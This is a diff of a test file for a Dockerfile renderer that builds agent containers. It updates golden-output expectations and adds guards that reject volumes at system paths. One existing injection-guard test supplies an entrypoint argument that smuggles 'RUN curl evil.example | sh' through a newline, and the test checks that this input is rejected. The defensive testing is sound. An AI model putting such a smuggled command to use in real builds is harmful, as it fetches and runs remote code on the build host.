@@ -109,7 +109,7 @@ describe('renderDockerfile golden output', () => {
       'RUN mkdir -p -- /home/agent /data && chown 10001:10001 -- /home/agent /data',
       'WORKDIR /app',
       'COPY requirements.txt ./',
-      'RUN pip install --no-cache-dir -r requirements.txt',
+      'RUN pip install --no-cache-dir --no-input -r requirements.txt',
       'COPY . /app',
       'USER 10001:10001',
       'CMD ["python","main.py"]',
@@ -124,7 +124,7 @@ describe('renderDockerfile golden output', () => {
 
     const proj = render(manifest({ runtime: 'python', entrypoint: ['python', 'main.py'] }), 'pip-project', 'python:3.12-slim').split('\n');
     expect(proj.some((l) => l.startsWith('COPY ') && l !== 'COPY . /app')).toBe(false);
-    expect(proj.indexOf('RUN pip install --no-cache-dir .')).toBeGreaterThan(proj.indexOf('COPY . /app'));
+    expect(proj.indexOf('RUN pip install --no-cache-dir --no-input .')).toBeGreaterThan(proj.indexOf('COPY . /app'));
   });
 
   it('copies dependency manifests before the rest of the source (layer caching)', () => {
@@ -138,8 +138,8 @@ describe('renderDockerfile golden output', () => {
   });
 
   it('creates and chowns every volume once, and /home/agent', () => {
-    const text = render(manifest({ volumes: ['/data', '/memory', '/data', '/home/agent'] }));
-    expect(text).toContain('RUN mkdir -p -- /home/agent /data /memory && chown 10001:10001 -- /home/agent /data /memory');
+    const text = render(manifest({ volumes: ['/data', '/memory', '/data', '/home/agent/state'] }));
+    expect(text).toContain('RUN mkdir -p -- /home/agent /data /memory /home/agent/state && chown 10001:10001 -- /home/agent /data /memory /home/agent/state');
   });
 
   it('puts USER before CMD and never runs as root', () => {
@@ -235,6 +235,11 @@ describe('renderDockerfile injection guards', () => {
 
   it('rejects a newline in an entrypoint argument (would start a new instruction)', () => {
     expectRejected(() => render(manifest({ entrypoint: ['node', 'index.js\nRUN curl evil.example | sh'] })));
+  });
+
+  // The Dockerfile chowns every volume path to the agent user, so a system directory must never get that far.
+  it.each(['/etc', '/proc', '/usr/local', '/tmp', '/home/agent', '/dev/shm', '//etc', '/./etc'])('rejects a volume at the system location %s', (volume) => {
+    expectRejected(() => render(manifest({ volumes: ['/data', volume] })));
   });
 
   it.each(['\r', '\t', '\0', '\u001b', '\u0085', ' '])('rejects control character %j in an entrypoint argument', (ch) => {
